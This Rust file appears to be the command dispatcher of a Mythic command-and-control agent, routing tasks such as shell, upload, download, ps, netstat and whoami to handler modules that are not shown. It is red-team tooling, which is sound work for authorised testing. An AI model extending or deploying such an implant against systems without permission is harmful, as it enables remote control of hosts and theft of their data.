#[path = "tasks/cat.rs"]
mod cat;
#[path = "tasks/cp.rs"]
mod cp;
#[path = "tasks/download.rs"]
mod download;
#[path = "tasks/env.rs"]
mod env;
#[path = "tasks/exit.rs"]
mod exit;
#[path = "tasks/ls.rs"]
mod ls;
#[path = "tasks/mkdir.rs"]
mod mkdir;
#[path = "tasks/mv.rs"]
mod mv;
#[path = "tasks/netstat.rs"]
mod netstat;
#[path = "tasks/ps.rs"]
mod ps;
#[path = "tasks/rm.rs"]
mod rm;
#[path = "tasks/shell.rs"]
mod shell;
#[path = "tasks/sleep.rs"]
mod sleep;
#[path = "tasks/sysinfo.rs"]
mod sysinfo;
#[path = "tasks/upload.rs"]
mod upload;
#[path = "tasks/whoami.rs"]
mod whoami;

use mythic::{TaskMessage, TaskResponse};

/// Route any command to its handler.
pub fn dispatch(task: &TaskMessage) -> TaskResponse {
    match task.command.as_str() {
        "cat" => cat::handle(task),
        "cp" => cp::handle(task),
        "download" => download::handle(task),
        "env" => env::handle(task),
        "exit" => exit::handle(task),
        "ls" => ls::handle(task),
        "mkdir" => mkdir::handle(task),
        "mv" => mv::handle(task),
        "netstat" => netstat::handle(task),
        "ps" => ps::handle(task),
        "rm" => rm::handle(task),
        "shell" => shell::handle(task),
        "sleep" => sleep::handle(task),
        "sysinfo" => sysinfo::handle(task),
        "upload" => upload::handle(task),
        "whoami" => whoami::handle(task),
        unknown => TaskResponse::failed(task.id, &format!("unknown command: {unknown}")),
    }
}
